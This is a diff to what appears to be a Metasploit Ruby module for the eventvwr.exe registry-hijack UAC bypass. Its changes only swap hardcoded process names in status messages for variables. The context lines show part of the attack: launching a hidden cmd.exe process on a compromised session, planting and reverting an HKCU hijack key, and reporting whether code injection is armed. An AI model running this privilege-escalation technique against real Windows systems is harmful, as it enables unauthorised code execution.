@@ -201,7 +201,7 @@ end
     print_warning("Please set EXEC_COMMAND option!")
     return nil
   else
-    print_status("Hijacking eventvwr.exe process!")
+    print_status("Hijacking #{vul_serve} process!")
     Rex::sleep(1.5)
   end
 
@@ -268,7 +268,7 @@ end
  Rex::sleep(4.5)
 
       # start remote service to gain code execution
-      print_good(" exec => Starting eventvwr.exe native process...")
+      print_good(" exec => Starting #{vul_serve} native process...")
       r = session.sys.process.execute("cmd.exe /c start #{vul_serve}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(1.0)
 
@@ -301,7 +301,7 @@ def ls_stage2
     print_warning("Please set DEL_REGKEY option!")
     return nil
   else
-    print_status("Revert eventvwr.exe process hijack!")
+    print_status("Revert binary.exe process hijack!")
     Rex::sleep(1.5)
   end
 
@@ -437,7 +437,7 @@ def ls_stage3
     print_line("    REPORT : None hijacking registry key was found under -> [HKCU]")
     print_line("           : that allows local/remote-code execution (enigma bypass)")
   else
-    print_line("    REPORT : Hijacking method its active, waiting for eventvwr.exe")
+    print_line("    REPORT : Hijacking method its active, waiting for #{vuln_soft}")
     print_line("           : execution to run injected string in target machine...")
   end
 
